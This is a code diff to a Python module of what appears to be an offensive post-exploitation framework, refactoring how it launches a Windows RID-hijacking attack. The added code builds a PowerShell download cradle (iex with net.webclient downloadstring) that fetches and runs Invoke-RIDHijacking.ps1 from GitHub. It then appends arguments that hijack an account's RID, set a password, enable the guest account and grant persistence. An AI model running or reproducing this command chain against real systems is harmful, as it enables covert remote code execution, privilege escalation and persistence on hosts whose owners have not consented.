@@ -30,32 +30,19 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        warrior_exist = False
-        for p in Path("/tmp/").glob("ibs-*"):
-            if str(p)[9:] == self.args["warrior"]:
-                warrior_exist = True
-                break
+        function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/r4wd3r/RID-Hijacking/master/Invoke-RIDHijacking.ps1');"
+        function += 'Invoke-RIDHijacking -RID {}'.format(self.args["RID"])
 
-        if warrior_exist:
-            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/r4wd3r/RID-Hijacking/master/Invoke-RIDHijacking.ps1');"
-            function += 'Invoke-RIDHijacking -RID {}'.format(self.args["RID"])
+        if self.args["user"]:
+            function += ' -User {}'.format(self.args["user"])
 
-            if self.args["user"]:
-                function += ' -User {}'.format(self.args["user"])
+        if self.args["password"]:
+            function += ' -Password {}'.format(self.args["password"])
 
-            if self.args["password"]:
-                function += ' -Password {}'.format(self.args["password"])
+        if str(self.args["useguest"]).lower() == 'true':
+            function += ' -UseGuest'
 
-            if str(self.args["useguest"]).lower() == 'true':
-                function += ' -UseGuest'
+        if str(self.args["enable"]).lower() == 'true':
+            function += ' -Enable'
 
-            if str(self.args["enable"]).lower() == 'true':
-                function += ' -Enable'
-
-            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
-                f.write(function)
-
-            cprint ('[+] Done!', 'green')
-
-        else:
-            cprint ('[!] Failed... Warrior not found', 'red')
+        super(CustomModule, self).run(function)
